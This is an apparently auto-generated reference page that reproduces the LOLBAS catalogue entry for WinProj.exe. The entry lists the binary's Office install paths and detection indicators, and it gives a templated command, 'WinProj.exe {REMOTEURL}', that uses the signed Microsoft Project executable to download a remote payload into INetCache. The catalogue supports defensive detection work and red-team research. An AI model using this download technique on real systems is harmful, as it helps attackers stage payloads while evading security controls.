---
parsed_by: focuslocust
source: lolbas
type: generated
---
# WinProj.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `winproj.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Winproj.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [WinProj.exe](../../tools/windows/winproj.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | winproj.exe |
| name | WinProj.exe |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@AvihayEldad'
  Person: Avihay Eldad
Author: Avihay Eldad
Commands:
- Category: Download
  Command: WinProj.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2024-02-14
Description: Microsoft Project Executable
Detection:
- IOC: URL on a WinProj command line
- IOC: WinProj making unexpected network connections or DNS requests
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office\Office14\WinProj.exe
- Path: C:\Program Files\Microsoft Office\Office14\WinProj.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\WinProj.exe
- Path: C:\Program Files\Microsoft Office\Office15\WinProj.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\WinProj.exe
- Path: C:\Program Files\Microsoft Office\Office16\WinProj.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\Office14\WinProj.exe
- Path: C:\Program Files\Microsoft Office\root\Office14\WinProj.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\Office15\WinProj.exe
- Path: C:\Program Files\Microsoft Office\root\Office15\WinProj.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\Office16\WinProj.exe
- Path: C:\Program Files\Microsoft Office\root\Office16\WinProj.exe
Name: WinProj.exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Winproj.yml
```

## Detection / Analysis Notes

```text
IOC: URL on a WinProj command line
```

```text
IOC: WinProj making unexpected network connections or DNS requests
```

```text
- IOC: URL on a WinProj command line
- IOC: WinProj making unexpected network connections or DNS requests
```
